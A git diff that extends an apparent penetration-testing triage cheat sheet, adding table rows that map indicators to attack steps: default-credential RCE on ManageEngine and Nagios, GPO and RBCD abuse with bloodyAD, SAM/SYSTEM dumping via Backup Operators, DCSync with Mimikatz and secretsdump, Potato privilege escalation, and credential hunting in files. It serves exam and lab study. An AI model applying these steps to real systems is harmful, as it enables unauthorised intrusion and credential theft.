@@ -18,9 +18,15 @@ This matrix is designed for rapid triage. When you see a specific "indicator" or
 | **LFI Vulnerability** | Try `//172.10.10.10/share` with `responder` running | Capture NTLM hashes (LFI-to-SMB) |
 | **FileUpload (Blocked .php)** | Upload `.htaccess` with `AddType` directive | Bypass extension filters |
 | **Writable SMB Share** | Upload `.lnk` file via `ntlm_theft.py` | Force NTLM authentication (Responder) |
+| **Port 8443 (HTTPS) Open** | ManageEngine Applications Manager | Try `admin:admin` -> Admin -> Actions -> Execute Program RCE |
+| **BloodHound (WriteOwner GPO)** | User can modify a GPO | Use `bloodyAD` to set `genericAll`, then edit `GptTmpl.inf` in SYSVOL |
+| **MariaDB (XAMPP) Found** | Port 3306 on Windows | Check `C:\xampp\passwords.txt` for default `root` creds |
 | **Web Service (Anonymous)** | `cadaver http://10.10.10.10` | Check for WebDAV PUT/MOVE permissions |
 | **CMS Admin Access** | Upload PHP shell via Plugin/Extension/Theme | RCE on web server |
 | **Nagios XI (Title/Favicon)**| Try `nagiosadmin:admin` or `nagiosadmin:nagios` | Admin access for RCE |
+| **BUILTIN\Backup Operators** | User has backup/restore rights | Use `reg save` to dump SAM/SYSTEM and crack hashes |
+| **Onboarding Document (.docx)** | Found in user home/shares | Scan for plaintext credentials (z.thomas, etc.) |
+| **SQL Connection String (.sql)** | Found in web root/shares | Extract DB service account credentials (db_user) |
 | **Nagios XI Admin Access** | Upload ELF shell as plugin to `monitoringplugins.php` | RCE as `nagios` or `root` |
 | **LFI (No Wrappers)** | Check `/var/log/apache2/access.log` (Poison UA) | LFI-to-RCE via Log Poisoning |
 | **Port 1433 Cracked** | `mssqlclient ...` then check `IMPERSONATE` rights | Escalation within SQL to Admin/System |
@@ -205,4 +211,13 @@ If you are stuck for more than 30 minutes, always check:
 3.  **Config Files**: `grep -ri "pass" /etc" or "findstr /s /i "password" *.xml`.
 4.  **Old Backups**: Look for `C:\windows.old`. If found, dump `SAM/SYSTEM` for old local hashes.
 
+
 **Results over theories. Execute and move.** 🚀
+
+### 11 AD: Inter-Domain Trust & Delegation
+| Indicator | Immediate Action | Tactic/Tool |
+| :--- | :--- | :--- |
+| **AllExtendedRights** on User | Reset password of target user | `bloodyAD set password` |
+| **GenericAll** on Computer | Exploit RBCD | `impacket-addcomputer` + `bloodyAD add rbcd` |
+| **Inter-Domain krbtgt** Ticket | DCSync parent from child | `Mimikatz` tickets export -> `Impacket-secretsdump -k` |
+| **SeImpersonate** Enabled | Potato-style LPE | `GodPotato`, `PrintSpoofer` |
